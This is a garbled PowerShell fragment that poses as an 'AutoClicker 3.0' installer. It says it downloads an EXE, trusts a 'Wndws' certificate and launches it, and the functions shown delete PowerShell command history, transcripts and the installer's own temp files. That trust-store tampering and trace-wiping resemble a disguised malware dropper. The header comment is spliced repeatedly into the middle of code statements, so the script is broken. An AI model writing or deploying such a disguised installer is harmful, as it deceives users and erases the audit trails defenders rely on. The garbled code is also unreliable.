...
function Get-PSReadLineHistoryFilePaths {
    ...
    ) | ForEach-Object { if (# AutoClicker 3.0 public installer - EXE only. Download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1
...
) { [void]$paths.Add(# AutoClicker 3.0 public installer - EXE only. Download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1
...
function Remove-StalePowerShellTranscripts {
    @(
        ...
        $parent = Split-Path # AutoClicker 3.0 public installer - EXE only. Download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1
...
Start-Sleep -Seconds 5
 -Parent
        ...
        Get-ChildItem -Path # AutoClicker 3.0 public installer - EXE only. Download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1
...
Start-Sleep -Seconds 5
 -File -ErrorAction SilentlyContinue | ForEach-Object {
            try { Remove-Item -LiteralPath # AutoClicker 3.0 public installer - EXE only. Download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1
...
Write-InstallPaths -ExePath $exePath
Start-Sleep -Seconds 5
.FullName -Force -ErrorAction Stop } catch {}
        }
    }
}
...
Write-InstallPaths -ExePath $exePath
Start-Sleep -Seconds 5
.Name -match '^(psrl_|ac_pub_dl_|myst_loc_installer_)' -and # AutoClicker 3.0 public installer - EXE only. Download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1
...
Start-Sleep -Seconds 5
        ...
        ForEach-Object {
            Remove-Item -LiteralPath # AutoClicker 3.0 public installer - EXE only. Download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1
...
.FullName -Force -ErrorAction SilentlyContinue
    ...
    if (Test-Path -LiteralPath $psrlRoot) {
        Get-ChildItem -LiteralPath $psrlRoot -Directory -ErrorAction SilentlyContinue |
            Where-Object { # AutoClicker 3.0 public installer - EXE only. Download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1
...
Write-InstallPaths -ExePath $exePath
Start-Sleep -Seconds 5
.CreationTime -lt (Get-Date).AddHours(-1) } |
            ForEach-Object {
                Remove-Item -LiteralPath # AutoClicker 3.0 public installer - EXE only. Download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1
